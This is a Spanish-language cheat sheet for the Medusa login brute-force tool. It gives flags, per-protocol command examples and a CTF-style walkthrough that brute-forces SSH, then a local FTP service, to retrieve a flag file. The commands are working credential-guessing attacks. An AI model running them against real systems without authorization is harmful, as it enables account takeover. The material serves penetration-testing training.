---
icon: globe-www
---

# Medusa

> Medusa es una herramienta de fuerza bruta de login rápida, masivamente paralela y modular, comparable a Hydra. Soporta múltiples servicios de autenticación remota mediante módulos específicos por protocolo.

### Sintaxis básica

```bash
medusa [target_options] [credential_options] -M module [module_options]
```

| Flag                  | Descripción                                                               |
| --------------------- | ------------------------------------------------------------------------- |
| `-h HOST` / `-H FILE` | Host único / archivo con lista de hosts                                   |
| `-u USER` / `-U FILE` | Usuario único / archivo con lista de usuarios                             |
| `-p PASS` / `-P FILE` | Contraseña única / archivo con lista de contraseñas                       |
| `-M MODULE`           | Módulo de ataque (ssh, ftp, http...)                                      |
| `-m "OPTION"`         | Opciones específicas del módulo (entre comillas)                          |
| `-t TASKS`            | Intentos paralelos                                                        |
| `-f` / `-F`           | Modo rápido: para al primer éxito (en el host actual / en cualquier host) |
| `-n PORT`             | Puerto no estándar                                                        |
| `-v LEVEL`            | Verbosidad (hasta 6)                                                      |
| `-e ns`               | Prueba contraseña vacía (`n`) y contraseña = usuario (`s`)                |

### Módulos

| Módulo     | Protocolo              | Ejemplo                                                                                                                     |
| ---------- | ---------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| `ftp`      | FTP                    | `medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |
| `http`     | HTTP GET/POST          | `medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^` |
| `imap`     | Correo entrante        | `medusa -M imap -h mail.example.com -U users.txt -P passwords.txt`                                                          |
| `mysql`    | Base de datos          | `medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt`                                                                 |
| `pop3`     | Correo entrante        | `medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt`                                                          |
| `rdp`      | Escritorio remoto      | `medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |
| `ssh`      | SSH                    | `medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt`                                                                   |
| `svn`      | Subversion             | `medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |
| `telnet`   | Telnet                 | `medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt`                                                               |
| `vnc`      | Acceso remoto          | `medusa -M vnc -h 192.168.1.100 -P passwords.txt`                                                                           |
| `web-form` | Formularios web (POST) | `medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"`   |

### Casos de uso

#### SSH básico

```bash
medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh
```

Prueba cada combinación usuario/contraseña contra el servicio SSH.

#### Múltiples servidores con Basic Auth (HTTP GET)

```bash
medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
```

Itera sobre una lista de hosts (`-H`) en vez de uno solo, útil para evaluar varios servidores a la vez.

#### Contraseñas vacías o por defecto

```bash
medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
```

`-e n` prueba contraseña vacía; `-e s` prueba contraseña = nombre de usuario. Cubre el caso de cuentas mal configuradas sin necesitar una wordlist completa.

### Caso práctico: SSH → FTP en cadena

Escenario: se conoce el usuario SSH (`sshuser`), se obtiene acceso, y desde dentro se descubre y ataca un segundo servicio (FTP) en el mismo host.

#### Fuerza bruta SSH

```bash
medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

| Parte         | Función                                                                                  |
| ------------- | ---------------------------------------------------------------------------------------- |
| `-h <IP>`     | Host objetivo                                                                            |
| `-n <PORT>`   | Puerto SSH (normalmente 22)                                                              |
| `-u sshuser`  | Usuario conocido                                                                         |
| `-P wordlist` | Lista de contraseñas más usadas                                                          |
| `-M ssh`      | Módulo SSH                                                                               |
| `-t 3`        | 3 intentos paralelos — subir este valor acelera pero aumenta riesgo de detección/bloqueo |

Resultado esperado:

```
ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t [SUCCESS]
```

#### Acceso y reconocimiento interno

```bash
ssh sshuser@<IP> -p PORT
```

Una vez dentro, identificar otros servicios activos:

```bash
netstat -tulpn | grep LISTEN
nmap localhost
```

Si aparece el puerto 21 abierto y nmap confirma `ftp`, hay un segundo servicio que atacar.

#### Identificar el usuario FTP probable

Revisar `/home` puede revelar el nombre de usuario del servicio (ej. carpeta `ftpuser` → probable usuario `ftpuser`).

#### Fuerza bruta FTP

```bash
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

Diferencias clave respecto al ataque SSH: host local (`127.0.0.1`, fuerza IPv4), módulo `ftp`, y más hilos paralelos (`-t 5`) al estar atacando localhost.

#### Obtener el archivo objetivo

```bash
ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
ftp> get flag.txt
ftp> exit

cat flag.txt
```
